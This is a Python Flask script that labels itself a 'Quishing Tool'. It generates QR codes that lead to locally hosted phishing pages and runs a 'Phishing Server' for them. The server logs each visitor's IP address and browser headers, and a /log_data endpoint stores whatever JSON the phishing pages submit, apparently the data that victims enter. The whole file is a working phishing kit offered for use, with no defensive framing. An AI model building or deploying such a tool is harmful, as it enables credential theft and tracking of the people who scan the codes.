import os
import qrcode
import logging
import sys
from flask import Flask, request, send_from_directory, abort, jsonify

app = Flask(__name__)

# Set up logging
log_directory = os.path.join(os.getcwd(), 'log')
os.makedirs(log_directory, exist_ok=True)

logging.basicConfig(
    filename=os.path.join(log_directory, 'access.log'),
    level=logging.INFO,
    format='%(asctime)s - IP: %(message)s'
)

def serve_site(site, filename):
    try:
        visitor_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        referer = request.headers.get('Referer')
        accept_language = request.headers.get('Accept-Language')
        logging.info(f"{visitor_ip} - User-Agent: {user_agent}, Referer: {referer}, Accept-Language: {accept_language}")
        return send_from_directory(os.path.join('sites', site), filename)
    except Exception as e:
        logging.error(f"Error serving site: {e}")
        abort(500)

def generate_qr(url, output_file, color='black', background='white'):
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(url)
        qr.make(fit=True)

        img = qr.make_image(fill_color=color, back_color=background)
        img.save(output_file)
        print(f"[INFO] QR Code generated and saved to {output_file}")
    except Exception as e:
        print(f"[ERROR] Failed to generate QR code: {e}")
        sys.exit(1)

def start_server():
    try:
        app.run(host='0.0.0.0', port=5000)
    except Exception as e:
        print(f"[ERROR] Failed to start the server: {e}")
        sys.exit(1)

def show_menu():
    print("===== Quishing Tool Menu =====")
    print("1. Generate QR Code for Site 1")
    print("2. Generate QR Code for Site 2")
    print("3. Start Phishing Server")
    print("4. Exit")
    choice = input("Please select an option (1-4): ")

    if choice == '1':
        url = 'http://localhost:5000/site1/index.html'
        output = input("Enter the output file name (default: phishing_qr_site1.png): ") or "phishing_qr_site1.png"
        generate_qr(url, output)
        show_menu()
    elif choice == '2':
        url = 'http://localhost:5000/site2/index.html'
        output = input("Enter the output file name (default: phishing_qr_site2.png): ") or "phishing_qr_site2.png"
        generate_qr(url, output)
        show_menu()
    elif choice == '3':
        print("Starting the phishing server...")
        start_server()
    elif choice == '4':
        print("Exiting the tool. Goodbye!")
        sys.exit(0)
    else:
        print("[ERROR] Invalid choice. Please select a valid option.")
        show_menu()

@app.route('/site1/<path:filename>', methods=['GET'])
def serve_site1(filename):
    return serve_site('site1', filename)

@app.route('/site2/<path:filename>', methods=['GET'])
def serve_site2(filename):
    return serve_site('site2', filename)

@app.route('/log_data', methods=['POST'])
def log_data():
    data = request.json
    visitor_ip = request.remote_addr
    logging.info(f"{visitor_ip} - Data: {data}")
    return jsonify({"status": "success"}), 200

if __name__ == "__main__":
    show_menu()
